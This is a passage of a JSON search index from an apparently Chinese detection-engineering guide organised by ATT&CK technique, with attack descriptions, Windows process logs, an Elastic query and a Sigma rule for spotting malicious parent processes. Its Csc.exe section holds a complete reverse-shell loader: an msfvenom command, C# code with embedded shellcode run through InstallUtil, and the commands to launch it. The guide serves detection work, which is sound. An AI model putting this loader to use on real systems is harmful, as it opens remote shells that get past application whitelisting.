D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1505-003</p> <p>https://attack.mitre.org/techniques/T1505/003/</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/","title":"T1566-001-win-\u53ef\u7591\u7684MS Office\u5b50\u8fdb\u7a0b","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u53d1\u9001\u5e26\u6709\u6076\u610f\u9644\u4ef6\u7684\u9c7c\u53c9\u5f0f\u7535\u5b50\u90ae\u4ef6\uff0c\u4ee5\u8bd5\u56fe\u8bbf\u95ee\u53d7\u5bb3\u8005\u7cfb\u7edf\u3002\u9c7c\u53c9\u5f0f\u9644\u4ef6\u4e0e\u5176\u4ed6\u5f62\u5f0f\u7684\u9c7c\u53c9\u5f0f\u9644\u4ef6\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c\u5b83\u4f7f\u7528\u4e86\u9644\u52a0\u5230\u7535\u5b50\u90ae\u4ef6\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u6240\u6709\u5f62\u5f0f\u7684\u9c7c\u53c9\u5f0f\u5e7f\u544a\u90fd\u662f\u4ee5\u7535\u5b50\u65b9\u5f0f\u4ea4\u4ed8\u7684\u9488\u5bf9\u7279\u5b9a\u4e2a\u4eba\uff0c\u516c\u53f8\u6216\u884c\u4e1a\u7684\u793e\u4f1a\u5de5\u7a0b\u5b66\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u4f1a\u5c06\u6587\u4ef6\u9644\u52a0\u5230\u6b3a\u9a97\u6027\u7535\u5b50\u90ae\u4ef6\u4e2d\uff0c\u5e76\u4e14\u901a\u5e38\u4f9d\u9760\u7528\u6237\u6267\u884c\u6765\u83b7\u5f97\u6267\u884c\u3002</p> <p>\u9644\u4ef6\u6709\u5f88\u591a\u9009\u9879\uff0c\u4f8b\u5982Microsoft Office\u6587\u6863\uff0c\u53ef\u6267\u884c\u6587\u4ef6\uff0cPDF\u6216\u5b58\u6863\u6587\u4ef6\u3002\u6253\u5f00\u9644\u4ef6\uff08\u5e76\u53ef\u80fd\u5355\u51fb\u8fc7\u53bb\u7684\u4fdd\u62a4\uff09\u540e\uff0c\u653b\u51fb\u8005\u7684\u6709\u6548\u8d1f\u8f7d\u4f1a\u5229\u7528\u6f0f\u6d1e\u6216\u76f4\u63a5\u5728\u7528\u6237\u7684\u7cfb\u7edf\u4e0a\u6267\u884c\u3002\u9c7c\u53c9\u5f0f\u7535\u5b50\u90ae\u4ef6\u7684\u6587\u672c\u901a\u5e38\u8bd5\u56fe\u7ed9\u51fa\u4e00\u4e2a\u5408\u7406\u7684\u539f\u56e0\u6765\u89e3\u91ca\u4e3a\u4ec0\u4e48\u5e94\u8be5\u6253\u5f00\u8be5\u6587\u4ef6\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u89e3\u91ca\u5982\u4f55\u7ed5\u5f00\u7cfb\u7edf\u4fdd\u62a4\u63aa\u65bd\u3002\u8be5\u7535\u5b50\u90ae\u4ef6\u8fd8\u53ef\u80fd\u5305\u542b\u6709\u5173\u5982\u4f55\u89e3\u5bc6\u9644\u4ef6\uff08\u4f8b\u5982zip\u6587\u4ef6\u5bc6\u7801\uff09\u7684\u8bf4\u660e\uff0c\u4ee5\u9003\u907f\u7535\u5b50\u90ae\u4ef6\u8fb9\u754c\u9632\u5fa1\u3002\u653b\u51fb\u8005\u7ecf\u5e38\u64cd\u7eb5\u6587\u4ef6\u6269\u5c55\u540d\u548c\u56fe\u6807\uff0c\u4ee5\u4f7f\u9644\u52a0\u7684\u53ef\u6267\u884c\u6587\u4ef6\u770b\u8d77\u6765\u50cf\u6587\u6863\u6587\u4ef6\uff0c\u6216\u8005\u5229\u7528\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u6587\u4ef6\u770b\u8d77\u6765\u50cf\u662f\u53e6\u4e00\u6587\u4ef6\u7684\u6587\u4ef6\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u53ef\u53c2\u770bwindows 4688\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u6837\u4f8b\uff0c\u8f85\u52a9\u7406\u89e3\u3002</p> <pre><code>Pre-Windows 2016/10\nA new process has been created.\n\nSubject:\n\n   Security ID:  WIN-R9H529RIO4Y\\Administrator\n   Account Name:  Administrator\n   Account Domain:  WIN-R9H529RIO4Y\n   Logon ID:  0x1fd23\n\nProcess Information:\n\n   New Process ID:  0xed0\n   New Process Name: C:\\Windows\\System32\\notepad.exe\n   Token Elevation Type: TokenElevationTypeDefault (1)\n   Mandatory Label: Mandatory Label\\Medium Mandatory Level\n   Creator Process ID: 0x8c0\n   Creator Process Name: c:\\windows\\system32\\explorer.exe\n   Process Command Line: C:\\Windows\\System32\\notepad.exe c:\\sys\\junk.txt\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#elastic-rule-query","title":"Elastic rule query","text":"<pre><code>event.action:\"Process Create (rule: ProcessCreate)\" and\nprocess.parent.name:(eqnedt32.exe or excel.exe or fltldr.exe or\nmsaccess.exe or mspub.exe or powerpnt.exe or winword.exe) and\nprocess.name:(Microsoft.Workflow.Compiler.exe or arp.exe or\natbroker.exe or bginfo.exe or bitsadmin.exe or cdb.exe or certutil.exe\nor cmd.exe or cmstp.exe or cscript.exe or csi.exe or dnx.exe or\ndsget.exe or dsquery.exe or forfiles.exe or fsi.exe or ftp.exe or\ngpresult.exe or hostname.exe or ieexec.exe or iexpress.exe or\ninstallutil.exe or ipconfig.exe or mshta.exe or msxsl.exe or\nnbtstat.exe or net.exe or net1.exe or netsh.exe or netstat.exe or\nnltest.exe or odbcconf.exe or ping.exe or powershell.exe or pwsh.exe\nor qprocess.exe or quser.exe or qwinsta.exe or rcsi.exe or reg.exe or\nregasm.exe or regsvcs.exe or regsvr32.exe or sc.exe or schtasks.exe or\nsysteminfo.exe or tasklist.exe or tracert.exe or whoami.exe or\nwmic.exe or wscript.exe or xwizard.exe)\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_6","title":"\u5efa\u8bae","text":"<p>\u53ef\u81ea\u884c\u8f6c\u6362\u4e3asigma\u683c\u5f0f\uff0c\u6765\u5b9e\u73b0\u5bf9\u591a\u4e2a\u5e73\u53f0\u7684\u652f\u6301\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1566-001</p> <p>https://attack.mitre.org/techniques/T10566/001/</p> <p>\u68c0\u6d4b\u53ef\u7591\u7684MS Office\u5b50\u8fdb\u7a0b</p> <p>https://www.elastic.co/guide/en/siem/guide/current/suspicious-ms-office-child-process.html</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/","title":"T1027-004-win-\u57fa\u4e8e\u767d\u540d\u5355Csc.exe\u914d\u7f6epayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u8bb8\u591a\u8f6f\u4ef6\u5f00\u53d1\u76f8\u5173\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6267\u884c\u5404\u79cd\u5f62\u5f0f\u7684\u4ee3\u7801\u4ee5\u534f\u52a9\u5f00\u53d1\u3001\u8c03\u8bd5\u548c\u9006\u5411\u5de5\u7a0b\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528\u5408\u6cd5\u8bc1\u4e66\u8fdb\u884c\u7b7e\u540d\u3002\u7b7e\u540d\u540e\uff0c\u5b83\u4eec\u5c31\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e0a\u6267\u884c\uff0c\u5e76\u901a\u8fc7\u53ef\u4fe1\u7684\u8fdb\u7a0b\u4ee3\u7406\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u6709\u6548\u5730\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u9632\u5fa1\u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>C#\u7684\u5728Windows\u5e73\u53f0\u4e0b\u7684\u7f16\u8bd1\u5668\u540d\u79f0\u662fCsc.exe\uff0c\u5982\u679c\u4f60\u7684.NET FrameWork SDK\u5b89\u88c5\u5728C\u76d8\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u5728C:\\WINNT\\Microsoft.NET\\Framework\\xxxxx\u76ee\u5f55\u4e2d\u53d1\u73b0\u5b83\u3002\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u4f60\u53ef\u4ee5\u624b\u52a8\u628a\u8fd9\u4e2a\u76ee\u5f55\u6dfb\u52a0\u5230Path\u73af\u5883\u53d8\u91cf\u4e2d\u53bb\u3002\u7528Csc.exe\u7f16\u8bd1HelloWorld.cs\u975e\u5e38\u7b80\u5355\uff0c\u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\uff0c\u5e76\u5207\u6362\u5230\u5b58\u653e test.cs\u6587\u4ef6\u7684\u76ee\u5f55\u4e2d\uff0c\u8f93\u5165\u4e0b\u5217\u884c\u547d\u4ee4:csc /target:exe test.cs \u5c06Ttest.cs \u7f16\u8bd1\u6210\u540d\u4e3a test.exe \u7684 console \u5e94\u7528\u7a0b\u5e8f</p> <p>\u8bf4\u660e\uff1aCsc.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0ccsc\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p> <p>win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p>C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe</p> <p>C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awindows server 2012</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_5","title":"\u6d4b\u8bd5\u8fc7\u7a0b","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#payload","title":"\u914d\u7f6epayload","text":"<pre><code>msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.126.146 lport=4444 -f csharp\n</code></pre> <p>copy buf \u5230 Micropoor_Csc.cs shellcode\u4e2d\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#micropoor_csccs","title":"Micropoor_Csc.cs","text":"<pre><code>using System;\n\nusing System.Net;\n\nusing System.Diagnostics;\n\nusing System.Reflection;\n\nusing System.Configuration.Install;\n\nusing System.Runtime.InteropServices;\n\n\n// msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.126.146 lport=4444 -f csharp\n\npublic class Program\n\n{\n\npublic static void Main()\n\n{\n\n}\n\n\n}\n\n[System.ComponentModel.RunInstaller(true)]\n\npublic class Sample : System.Configuration.Install.Installer\n\n{\n\npublic override void Uninstall(System.Collections.IDictionary savedState)\n\n{\n\nShellcode.Exec();\n\n}\n\n}\n\npublic class Shellcode\n\n{\n\npublic static void Exec()\n\n{\n\nbyte[] shellcode = new byte[510] {\n0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,\n0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,\n0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,\n0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,\n0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,\n0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,\n0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,\n0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,\n0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,\n0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,\n0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,\n0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,\n0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,\n0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,\n0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,\n0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,\n0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x7e,0x92,0x41,0x54,0x49,0x89,0xe4,\n0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,\n0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,\n0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,\n0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,\n0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,\n0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,\n0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,\n0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,\n0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,\n0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,\n0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,\n0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,\n0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,\n0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,\n0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,\n0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,\n0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };\n\nUInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,\n\nMEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\nMarshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);\n\nIntPtr hThread = IntPtr.Zero;\n\nUInt32 threadId = 0;\n\nIntPtr pinfo = IntPtr.Zero;\n\nhThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\nWaitForSingleObject(hThread, 0xFFFFFFFF);\n\n}\n\nprivate static UInt32 MEM_COMMIT = 0x1000;\n\nprivate static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\n[DllImport(\"kernel32\")]\n\nprivate static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\n[DllImport(\"kernel32\")]\n\nprivate static extern bool VirtualFree(IntPtr lpAddress,\n\nUInt32 dwSize, UInt32 dwFreeType);\n\n[DllImport(\"kernel32\")]\n\nprivate static extern IntPtr CreateThread(\n\nUInt32 lpThreadAttributes,\n\nUInt32 dwStackSize,\n\nUInt32 lpStartAddress,\n\nIntPtr param,\n\nUInt32 dwCreationFlags,\n\nref UInt32 lpThreadId\n\n);\n\n[DllImport(\"kernel32\")]\n\nprivate static extern bool CloseHandle(IntPtr handle);\n\n[DllImport(\"kernel32\")]\n\nprivate static extern UInt32 WaitForSingleObject(\n\nIntPtr hHandle,\n\nUInt32 dwMilliseconds\n\n);\n\n[DllImport(\"kernel32\")]\n\nprivate static extern IntPtr GetModuleHandle(\n\nstring moduleName\n\n);\n\n[DllImport(\"kernel32\")]\n\nprivate static extern UInt32 GetProcAddress(\n\nIntPtr hModule,\n\nstring procName\n\n);\n\n[DllImport(\"kernel32\")]\n\nprivate static extern UInt32 LoadLibrary(\n\nstring lpFileName\n\n);\n\n[DllImport(\"kernel32\")]\n\nprivate static extern UInt32 GetLastError();\n\n}\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_6","title":"\u9776\u673a\u6267\u884c","text":"<pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:1.exe /platform:x64 /unsafe C:\\Users\\Administrator\\Desktop\\a\\1.cs\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Administrator\\Desktop\\a\\1.exe\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_7","title":"\u83b7\u53d6\u4f1a\u8bdd","text":"<p>\u672a\u80fd\u6210\u529f\u83b7\u53d6\u4f1a\u8bdd\uff0c\u4f46\u4e0d\u5f71\u54cd\u9488\u5bf9\u6b64\u884c\u4e3a\u8fdb\u884c\u5206\u6790\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_8","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>\u4e8b\u4ef6ID\uff1a 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID:0xa9c\n\u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1)\n\u521b\u5efa\u8005\u8fdb\u7a0b ID:0xaa0\n\u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe  /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:1.exe /platform:x64 /unsafe C:\\Users\\Administrator\\Desktop\\a\\1.cs\n\n\u4e8b\u4ef6ID\uff1a 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID:0x984\n\u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1)\n\u521b\u5efa\u8005\u8fdb\u7a0b ID:0xaa0\n\u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe  /logfile= /LogToConsole=false /U C:\\Users\\Administrator\\Desktop\\a\\1.exe\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_9","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Suspicious Parent of Csc.exe\ndescription: Detects a suspicious parent of csc.exe, which could by a sign of payload delivery\nstatus: experimental\nreferences:\n    - https://twitter.com/SBousseaden/status/1094924091256176641\ntags:\n    - attack.defense_evasion\n    - attack.t1027-004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\csc.exe*'\n        ParentImage:\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n            - '*\\mshta.exe'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_10","title":"\u5efa\u8bae","text":"<p>\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_11","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1027-004</p> <p>https://attack.mitre.org/techniques/T1027/004/</p> <p>\u57fa\u4e8e\u767d\u540d\u5355Csc.exe\u6267\u884cpayload\u7b2c\u4e03\u5b63</p> <p>https://micro8.gitbook.io/micro8/contents-1/71-80/77-ji-yu-bai-ming-dan-csc.exe-zhi-hang-payload-di-qi-ji</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/","title":"T1047-win-\u57fa\u4e8e\u767d\u540d\u5355WMIC\u6267\u884cpayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>WMI\uff08Windows Management 